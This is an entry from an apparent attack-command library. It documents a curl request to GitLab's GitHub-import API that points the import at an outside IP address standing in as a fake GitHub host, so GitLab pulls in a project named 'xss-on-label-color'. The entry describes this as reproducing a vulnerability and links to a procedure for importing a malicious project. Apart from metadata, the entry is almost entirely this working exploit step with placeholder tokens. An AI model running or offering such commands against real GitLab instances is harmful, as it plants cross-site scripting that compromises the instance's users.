---
id: cmd-uuid-4
data: >-
  curl -kv "https://gitlab.com/api/v4/import/github" --request POST --header
  "content-type: application/json" --header "PRIVATE-TOKEN:
  AAAAAAAAAAAAAYYYYabc" --data '{"personal_access_token":
  "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "repo_id": "523303538",
  "target_namespace": "yvvdwf", "new_name": "xss-on-label-color",
  "github_hostname": "http://51.75.74.52:80"}'
tags:
  - api
  - import
type: command
output: Successful import JSON response
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:56:19.861Z'
verified: false
validated: true
submitted: true
---
# curl-gitlab-import-example

## Command

```bash
curl -kv "https://gitlab.com/api/v4/import/github" --request POST --header "content-type: application/json" --header "PRIVATE-TOKEN: AAAAAAAAAAAAAYYYYabc" --data '{"personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "repo_id": "523303538", "target_namespace": "yvvdwf", "new_name": "xss-on-label-color", "github_hostname": "http://51.75.74.52:80"}'
```

## Description

Example curl for importing with specific values to reproduce the vuln.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -kv | Verbose/insecure | Yes |
| PRIVATE-TOKEN | Example token | Yes |
| --data | Specific JSON payload | Yes |

## Examples

### Basic Usage

As above.

### Advanced Usage

N/A

## Expected Output

API success: Project imported at /yvvdwf/xss-on-label-color.

## Related

- [[Related Procedure|procedures/Import-Malicious-Project-into-GitLab-via-API]]
